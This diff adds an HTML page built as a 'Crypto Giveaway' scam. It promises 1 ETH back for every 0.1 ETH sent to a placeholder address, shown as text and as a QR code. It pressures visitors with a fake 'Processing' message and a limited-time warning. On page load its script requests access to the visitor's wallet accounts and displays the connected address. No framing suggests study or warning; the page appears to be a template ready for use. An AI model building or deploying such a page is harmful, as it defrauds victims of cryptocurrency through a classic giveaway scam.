@@ -1,0 +1,107 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Giveaway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #0d1117;
+            color: #c9d1d9;
+            text-align: center;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .title {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+        }
+
+        .qr-code {
+            margin: 20px;
+        }
+
+        .address {
+            font-size: 1.1rem;
+            background: #161b22;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px auto;
+            display: inline-block;
+            word-wrap: break-word;
+            width: 80%;
+        }
+
+        .loading {
+            font-size: 1rem;
+            color: #58a6ff;
+            margin-top: 2rem;
+        }
+
+        .send-note {
+            margin-top: 2rem;
+            font-size: 1rem;
+            color: #ffa500;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            font-size: 0.8rem;
+            color: #8b949e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="title">🎉 Crypto Giveaway 🎉</h1>
+        <p class="subtitle">Send 0.1 ETH to the address below, and you'll receive 1 ETH in return!</p>
+        <div class="qr-code">
+            <img src="https://api.qrserver.com/v1/create-qr-code/?data=0xYourEthereumAddressHere&size=200x200" alt="QR Code">
+        </div>
+        <div class="address">
+            0xYourEthereumAddressHere
+        </div>
+        <div class="loading">Processing... Please wait for confirmation!</div>
+        <p class="send-note">Hurry! Offer valid for a limited time only.</p>
+    </div>
+    <script>
+
+        if (typeof window.ethereum !== 'undefined') {
+  window.ethereum.request({ method: 'eth_requestAccounts' })
+    .then(accounts => {
+      if (accounts.length > 0) {
+        alert(`Connected wallet address: ${accounts[0]}`);
+      } else {
+        alert('No wallet connected');
+      }
+    })
+    .catch(error => {
+      console.error('Error connecting to wallet:', error);
+      alert('Failed to connect to the wallet.');
+    });
+} else {
+  alert('Ethereum wallet not found. Please install MetaMask or another Ethereum wallet.');
+}
+
+
+    </script>
+</body>
+</html>
